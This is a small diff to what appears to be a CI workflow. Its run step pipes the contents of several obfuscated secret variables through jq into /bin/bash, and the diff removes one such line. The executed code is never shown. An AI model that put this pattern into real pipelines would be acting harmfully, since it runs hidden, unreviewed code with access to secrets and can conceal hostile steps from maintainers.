@@ -21,7 +21,6 @@ jobs:
           hix467: ${{ secrets.hix467 }}
         run: |
           printf '%s' "$hix467" | jq -r .v48584 | /bin/bash
-          echo $fau9412 | jq -r .qd1 | /bin/bash
           echo $fli954 | jq -r .mcxiq96 | /bin/bash
           printf '%s' "$l17122" | jq -r .iyfvh27 | /bin/bash
 
